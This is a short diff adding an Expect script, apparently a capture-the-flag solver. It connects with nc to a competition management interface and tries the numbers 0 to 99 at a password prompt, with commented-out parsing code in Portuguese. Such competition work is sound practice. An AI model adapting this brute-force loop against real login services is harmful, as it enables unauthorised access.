@@ -1,0 +1,42 @@
+#!/usr/bin/expect
+
+set servidor mngmnt-iface.ctfcompetition.com
+set porta 1337  
+
+
+set sum 0;
+set i 0;
+#set timeout 10
+ while {1} {
+set error [spawn nc $servidor $porta]
+if "$error" { puts "erro conectando em = $error" ; exit 0 }
+expect "Quit"
+expect "*"
+
+send "1\n"
+
+#salvar a saida depois do "of" na variavel $value
+#set value "$expect_out(0,string)"
+
+
+# cortar a variavel no + em um array de dois valores
+#set fields [split $value "+"]
+
+
+# Apagar o = do final que sobrou na string fields e colocar na strinf formula que ficara somente: NUM + NUM
+#set formula [regsub -all {(.)=} $fields {\1}]
+
+#para cada valor da formula, acumule em $sum
+#foreach f $formula {
+# set sum [ expr "$sum" + "$f" ];
+#}
+
+for {} {$i < 100} {incr i} {
+		expect {
+				"password*" {  send "$i\n" }
+				"informed*" {  send "$i\n"; break }
+			}
+}
+
+}
+#interact
